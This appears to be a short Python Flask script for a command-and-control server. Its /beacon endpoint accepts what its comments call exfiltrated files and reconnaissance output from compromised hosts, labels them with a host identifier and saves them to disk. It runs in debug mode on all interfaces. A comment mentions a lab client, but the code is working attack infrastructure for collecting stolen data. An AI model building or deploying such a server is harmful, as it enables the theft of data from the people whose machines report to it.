from flask import Flask, request, jsonify
import os
from datetime import datetime

app = Flask(__name__)

# Where exfiltrated files will be stored (relative to this script)
UPLOAD_FOLDER = os.path.join(os.path.dirname(__file__), "uploads")
os.makedirs(UPLOAD_FOLDER, exist_ok=True)


@app.route("/", methods=["GET"])  # ADD THIS LINE
def test():
         return "C2 Server OK - use POST /beacon"


@app.route("/beacon", methods=["POST"])
def beacon():
    """
    Simple C2 upload endpoint.
    Expects:
      - raw file bytes in the request body
      - optional X-Filename header
      - optional X-Host header (client identifier)
    """
    # Get raw bytes of the request body
    data = request.get_data()  # bytes, no decoding [web:15]

    if not data:
        return jsonify({"status": "error", "reason": "empty body"}), 400

    # Basic metadata from headers
    fname_hdr = request.headers.get("X-Filename", "recon_combined.txt")
    host_id = request.headers.get("X-Host", "unknown_host")

    # Make filename unique per upload
    timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    safe_name = fname_hdr.replace("\\", "_").replace("/", "_")
    out_name = f"{host_id}_{timestamp}_{safe_name}"

    out_path = os.path.join(UPLOAD_FOLDER, out_name)

    with open(out_path, "wb") as f:
        f.write(data)

    return jsonify({
        "status": "ok",
        "saved_as": out_name,
        "size_bytes": len(data),
    }), 200


    


if __name__ == "__main__":
    # Bind to all interfaces so your lab client can reach it
    app.run(host="0.0.0.0", port=5000, debug=True)